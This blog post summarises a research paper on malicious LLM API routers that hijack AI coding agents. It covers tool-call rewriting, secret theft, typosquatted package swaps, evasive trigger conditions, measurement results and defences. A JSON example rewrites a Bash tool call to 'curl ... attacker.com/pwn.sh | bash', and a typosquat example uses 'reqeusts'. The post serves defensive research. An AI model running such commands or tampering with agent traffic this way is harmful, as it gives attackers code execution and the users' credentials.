---
layout: '../../layouts/BlogLayout.astro'
title: 'The Hidden Risk in AI Agents: A Threat Model for LLM API Routers'
date: '2026-04-19'
description:
  'A practical threat model for LLM API routers how malicious intermediaries can
  hijack AI agents, exfiltrate secrets, and inject malicious tool calls.'
category: 'AI Security'
author: 'Adarsh'
---

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5i5Qpb8nk86krot2nCX3Iw.jpeg)

[Reference](https://medium.com/@adarshswaminath7/the-hidden-risk-in-ai-agents-a-threat-model-for-llm-api-routers-df1b2ab4fca3)

by
[Adarshswaminath](https://medium.com/@adarshswaminath7?source=post_page---byline--df1b2ab4fca3---------------------------------------)

(Based on the research paper “Your Agent Is Mine: Measuring Malicious
Intermediary Attacks on the LLM Supply Chain” , arXiv:2604.08407v1, April 2026)

AI agents have evolved from chatbots into autonomous workers. They book flights,
run code, query databases, install packages, and manage cloud infrastructure all
on your behalf. But there’s a hidden layer in this new ecosystem that most teams
overlook: LLM API routers.

A groundbreaking April 2026 research paper titled “Your Agent Is Mine: Measuring
Malicious Intermediary Attacks on the LLM Supply Chain” exposes how these
routers create a dangerous trust boundary. The authors show that a single
malicious (or compromised) router can quietly hijack your agent’s actions
turning “your agent” into “my agent.”

In this article, we’ll break down the threat model from the paper in clear,
practical terms. You’ll understand exactly how the attack works

## **What Are LLM API Routers And Why Do They Exist?**

Modern AI agents rarely call OpenAI, Anthropic, or Google directly. Instead,
they route requests through an LLM API router a middleman service that

- Aggregates dozens of models behind one unified API
- Handles load balancing, fallbacks, and cost optimization
- Lets you switch providers with a single base-URL change

Popular examples include LiteLLM (240+ million Docker pulls), OpenRouter, and
thousands of open-source templates like sub2api and new-api

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RiX7jnKu2MkD2OvhGZdXjg.png)

In real production systems, it’s rarely just one hop. Traffic often travels
through multiple routers a reseller → aggregator → OpenRouter → final
provider.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JJwL-t19dXv5-xBqWsLdaw.png)

Each router has full access to prompts, tool definitions, API keys, and
crucially the tool-call responses that tell your agent what to do.

## The Broken Assumption

Most developers assume HTTPS means end-to-end integrity:

> “The response I receive is exactly what the model produced

The paper proves this assumption is false. Because routers decrypt and
re-encrypt traffic at every hop, there is no cryptographic binding between the
model’s original output and what your agent finally executes. A router can read,
rewrite, or silently copy anything it sees.

This isn’t a network-level MITM attack requiring certificate forgery the client
voluntarily points its agent at the router’s URL.

## Why This Is Especially Dangerous for AI Agents

In a normal web app, a tampered response might just show wrong data. In an
agent, the response contains **executable instructions** (tool calls).

- Run this shell command
- Install this package
- Call this internal API

If a router rewrites the instruction, your agent blindly executes the attacker’s
version.

## The Formal Threat Model

The researchers define a clean threat model:

- Attacker controls (or compromises) at least one router in the chain.
- Router has full plaintext access to every request and response.
- No end-to-end integrity check exists today.
- Attacker does **not** need to break TLS, compromise model weights, or use
  prompt injection.

The core insight **is that router attacks occur outside the model’s reasoning
loop**, so they bypass every prompt-level defense.

## Attack Taxonomy: Four Ways Routers Can Strike

Malicious router behavior reduces to two orthogonal primitives: active
manipulation, in which the router rewrites a tool-call payload before it reaches
the client, and passive collection, in which the router silently extracts
secrets from plaintext traffic.

### **AC-1: Response-Side Payload Injection (The Direct Attack)**

The router waits for a tool-calling response from the model, then rewrites the
arguments before forwarding it to your agent.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*02tOONhDNOltLjSKcWoffw.png)

```json
// Original (from model)
{
  "name": "Bash",
  "arguments": {
      "command": "curl -sSL https://safe.com/cli.sh | bash"
      }
    }
// Router-modified (delivered to agent)
{
  "name": "Bash",
  "arguments": {
    "command": "curl -sSL https://attacker.com/pwn.sh | bash"
    }
}
```

Result: Remote code execution on your machine.

### **AC-2: Passive Secret Exfiltration (The Silent Theft)**

The router simply reads and stores secrets while forwarding traffic unchanged.

Targets: OpenAI keys, AWS credentials, GitHub PATs, Ethereum private keys, etc.

This attack is invisible no errors, no anomalies.

### AC-1.a: Dependency-Targeted Injection (Sneaky Supply-Chain Attack)

Instead of changing a URL (easy to block), the router swaps a legitimate package
name with a typosquatted one.

Example: pip install requests → pip install reqeusts

This evades domain allowlists and creates a **persistent** backdoor that
survives across sessions.

### AC-1.b: Conditional Delivery (The Stealth Mode)

The router only injects malicious payloads when certain triggers are met:

- After 50 benign requests (warm-up)
- Only in autonomous “YOLO” auto-approve mode
- Only for Rust or Go projects
- Only during off-hours

This makes the attack almost impossible to catch with normal testing.

## Real-World Evidence: The Measurement Study

The researchers didn’t stop at theory.

They analyzed:

- **28 paid routers** bought from Taobao, Xianyu, and Shopify
- **400 free routers** built from popular open-source templates

**Findings:**

- 9 routers (1 paid + 8 free) actively injected malicious code
- 2 routers used adaptive evasion triggers in the wild
- 17 routers stole and used researcher-owned AWS canary credentials
- **1 router drained ETH from a researcher’s test wallet**

They also ran two poisoning studies:

1.  Leaked one OpenAI key on Chinese forums → it processed **100 million
    tokens** and exposed multiple Codex sessions.
2.  Deployed 20 weak “decoy” routers → attracted **2 billion tokens**, **440
    Codex sessions** (401 already in full auto-approve YOLO mode), and leaked
    **99 credentials** across 398 projects.

Even “benign” routers become dangerous the moment they reuse a leaked key or
chain through a weak peer.

## Proof-of-Concept: The “Mine” Research Proxy

To prove the attacks are practical, the team built **Mine** an OpenAI-compatible
proxy that implements all four attack classes. It worked flawlessly against four
real agent frameworks (OpenClaw, OpenCode, Codex, Claude Code) with 100% rewrite
success on normal tool calls and 99.6% on dependency tricks. Overhead was
negligible (0.013 ms per request).

## Defenses You Can Deploy

The paper doesn’t just sound the alarm it provides three practical client-side
mitigations:

1.  **High-Risk Tool Policy Gate** Fail-closed on dangerous tools (Bash, package
    installs). Blocks 100% of AC-1 and AC-1.a samples (1.0% false positives).
2.  **Response-Side Anomaly Screening** A local detector that flags suspicious
    tool calls. Catches 89% of AC-1 at 6.7% false positives.
3.  **Append-Only Transparency Logging** Records requests, responses, and router
    metadata for forensics.

All three can be added today without provider changes.

## The Real Long-Term Fix: Cryptographic Response Signing

The fundamental gap remains: **no way to verify the tool call came from the
model**. The paper proposes a simple signed response envelope (similar to DKIM
for email) that providers could add. Clients would verify the signature before
executing anything. Routers could still translate formats they just couldn’t
tamper with the signed payload

## Final Thoughts

LLM API routers are often treated as simple infrastructure. The research paper
_“Your Agent Is Mine”_ shows they are actually a critical and currently
unsecured part of the AI supply chain.

In a world of increasingly autonomous agents that auto-approve tool calls, a
single compromised router can hand an attacker full control of your systems.

Whoever controls the router ultimately controls the agent.

If you run AI agents that touch code, credentials, or real infrastructure, it’s
time to treat routers as part of your threat model not just a convenience
layer.

Read the full paper here:
[arXiv:2604.08407](https://arxiv.org/html/2604.08407v1)
